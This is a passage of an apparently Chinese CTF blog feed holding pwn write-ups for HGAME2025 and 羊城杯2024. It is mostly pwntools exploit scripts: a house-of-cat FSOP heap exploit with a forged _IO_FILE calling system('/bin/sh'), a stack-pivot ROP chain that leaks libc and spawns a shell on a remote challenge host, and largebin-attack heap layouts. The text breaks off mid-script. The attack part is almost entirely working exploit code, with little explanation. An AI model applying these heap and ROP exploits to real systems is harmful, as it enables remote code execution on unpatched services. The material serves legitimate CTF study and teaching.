class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(elf.libc.path, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">b&#x27;c&#x27;</span>,<span class="built_in">id</span>=<span class="number">0</span>,name=<span class="string">&#x27;n&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt;&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,name,size,content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):<span class="comment">#13</span></span><br><span class="line">    add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#6</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x110</span>) <span class="comment">#6</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x110</span>) <span class="comment">#6</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x110</span>) <span class="comment">#6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment">#13</span></span><br><span class="line">    add(<span class="number">0x100</span>) </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#14</span></span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Information: &#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xe63</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base:&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line">key = (heap_base &gt;&gt; <span class="number">12</span>) + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key:&quot;</span>, <span class="built_in">hex</span>(key))</span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#15</span></span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x21ac63</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">__exit_hook = libc_base + <span class="number">0x2169F8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__exit_hook:&quot;</span>, <span class="built_in">hex</span>(__exit_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#16 #0xe10</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#17 clean chunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 18-24</span></span><br><span class="line">    add(<span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">hex</span>((heap_base+<span class="number">0x1540</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x120</span>,<span class="number">0x110</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x121</span>)+p64((libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>])^key))</span><br><span class="line"></span><br><span class="line"><span class="comment">#house of cat</span></span><br><span class="line">fake_io_addr=heap_base+<span class="number">0x21c8</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE =  <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_IO_FILE += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>) <span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]) <span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(next_chain)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>) <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>) <span class="comment">#_wide_data,rax1</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x30</span>) <span class="comment"># vtable=IO_wfile_jumps+0x10 FSOP改为IO_wfiel_jumps+0x30</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>) <span class="comment"># #rax2 -&gt; to make [rax+0x18] = setcontext + 61</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_IO_FILE)))</span><br><span class="line">add(<span class="number">0x200</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x110</span>)</span><br><span class="line">add(<span class="number">0x110</span>,name=p64(fake_io_addr))</span><br><span class="line">pause()</span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/write-up/">write up</category>
      
      
      <category domain="http://example.com/tags/chunk-overlapping/">chunk overlapping</category>
      
      <category domain="http://example.com/tags/largebin-attack/">largebin attack</category>
      
      <category domain="http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</category>
      
      <category domain="http://example.com/tags/io-file/">io_file</category>
      
      <category domain="http://example.com/tags/setcontext/">setcontext</category>
      
      <category domain="http://example.com/tags/house-of-cat/">house of cat</category>
      
      <category domain="http://example.com/tags/orw/">orw</category>
      
      <category domain="http://example.com/tags/format/">format</category>
      
      <category domain="http://example.com/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/">数组越界</category>
      
      <category domain="http://example.com/tags/house-of-botcake/">house of botcake</category>
      
      <category domain="http://example.com/tags/mprotect/">mprotect</category>
      
      
      <comments>http://example.com/2025/02/18/HGAME2025-pwn-writeup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>羊城杯2024 pwn 部分wp</title>
      <link>http://example.com/2024/08/29/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024-pwn-%E9%83%A8%E5%88%86wp/</link>
      <guid>http://example.com/2024/08/29/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024-pwn-%E9%83%A8%E5%88%86wp/</guid>
      <pubDate>Thu, 29 Aug 2024 04:36:19 GMT</pubDate>
      
      <description>&lt;p&gt;好久没写博客了，写篇wp水一下(doge)&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>好久没写博客了，写篇wp水一下(doge)</p><span id="more"></span><h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><p>老经典的栈迁移了，具体看<a href="https://ccjssjdyka.com/2024/03/27/%E6%A0%88%E8%BF%81%E7%A7%BB/#more">栈迁移 | feichai’s Blog (ccjssjdyka.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        shell wmctrl -r :ACTIVE: -b add,above</span></span><br><span class="line"><span class="string">        shell wmctrl -r :ACTIVE: -e 0,110,80,1700,1300</span></span><br><span class="line"><span class="string">        b *$rebase(0x1100)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;139.155.126.78&quot;</span>,<span class="number">32854</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    puts_plt=elf.plt[<span class="string">b&#x27;puts&#x27;</span>]</span><br><span class="line">    puts_got=elf.got[<span class="string">b&#x27;puts&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">    leave_ret = <span class="number">0x00000000004006db</span></span><br><span class="line">    bss = <span class="number">0x601010</span> + <span class="number">0x300</span></span><br><span class="line">    pop_rbp = <span class="number">0x00000000004005b0</span></span><br><span class="line">    ret = <span class="number">0x0000000000400506</span></span><br><span class="line">    </span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss+<span class="number">0x30</span>)+p64(<span class="number">0x4006B8</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;overflow?&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">    pd+=p64(pop_rbp)+p64(bss+<span class="number">0x500</span>)+p64(<span class="number">0x4006C4</span>)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x30</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    sa(<span class="string">b&#x27;overflow?&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    libc_base = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)-libc.symbols[<span class="string">b&#x27;puts&#x27;</span>]</span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">    libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    pd=  p64(pop_rdi)+p64(bin_sh_addr)+p64(libc_system)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x30</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(bss+<span class="number">0x500</span>-<span class="number">0x30</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    </span><br><span class="line">    s(pd)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h3><p>这题做的挺久的，主要是第一次做到这种加上Dijkstra算法的题，但是理清思路后完全不难，就把路径当成堆块的编号就好了，漏洞利用跟算法无关</p><p>largebin attack + setcontext + FSOP + orw</p><p>用的是house of cat 的链子，不得不说，这链子真好用，下面一题也是用的这个链子，恰巧两题都有exit函数，真香，难点是堆块的布局和构造堆块利用堆溢出来实现largebin attack，就是下面这部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x520</span>,c[<span class="number">0</span>],c[<span class="number">0</span>]) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x520</span>,c[<span class="number">1</span>],c[<span class="number">1</span>]) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x520</span>,c[<span class="number">2</span>],c[<span class="number">2</span>]) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x520</span>,c[<span class="number">3</span>],c[<span class="number">3</span>]) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x520</span>,c[<span class="number">4</span>],c[<span class="number">4</span>]) <span class="comment">#11 0x3df0</span></span><br><span class="line">add(<span class="number">0x520</span>,c[<span class="number">0</span>],c[<span class="number">2</span>]) <span class="comment">#12 0x4330</span></span><br><span class="line">add(<span class="number">0x510</span>,c[<span class="number">0</span>],c[<span class="number">3</span>],payload) <span class="comment">#13 0x4850</span></span><br><span class="line"></span><br><span class="line">free(c[<span class="number">0</span>],c[<span class="number">2</span>])</span><br><span class="line">free(c[<span class="number">4</span>],c[<span class="number">4</span>]) </span><br><span class="line">free(c[<span class="number">3</span>],c[<span class="number">3</span>]) </span><br><span class="line">free(c[<span class="number">2</span>],c[<span class="number">2</span>]) </span><br><span class="line">free(c[<span class="number">1</span>],c[<span class="number">1</span>]) </span><br><span class="line">free(c[<span class="number">0</span>],c[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x530</span>,c[<span class="number">2</span>],c[<span class="number">3</span>]) <span class="comment">#14 0x2930</span></span><br><span class="line">add(<span class="number">0x530</span>,c[<span class="number">2</span>],c[<span class="number">3</span>]) <span class="comment">#15 0x2e70</span></span><br><span class="line">add(<span class="number">0x530</span>,c[<span class="number">0</span>],c[<span class="number">4</span>],<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)+p32(<span class="number">3</span>)+p32(<span class="number">3</span>)) <span class="comment">#16 0x33b0</span></span><br><span class="line">add(<span class="number">0x510</span>,c[<span class="number">2</span>],c[<span class="number">3</span>],<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4e0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)+p32(<span class="number">4</span>)+p32(<span class="number">4</span>)) <span class="comment">#17 0x38f0</span></span><br><span class="line">add(<span class="number">0x510</span>,c[<span class="number">2</span>],c[<span class="number">3</span>],<span class="string">b&#x27;./flag\x00\x00&#x27;</span>) <span class="comment">#18 0x3e10</span></span><br><span class="line">add(<span class="number">0x510</span>,c[<span class="number">2</span>],c[<span class="number">3</span>],orw) <span class="comment">#19 0x4330</span></span><br><span class="line"></span><br><span class="line">free(c[<span class="number">3</span>],c[<span class="number">3</span>])</span><br><span class="line">add(<span class="number">0x530</span>,c[<span class="number">2</span>],c[<span class="number">3</span>])</span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)</span><br><span class="line">pd += p64(libc_base+<span class="number">0x21b110</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x38c0</span>)+p64(_IO_list_all-<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span 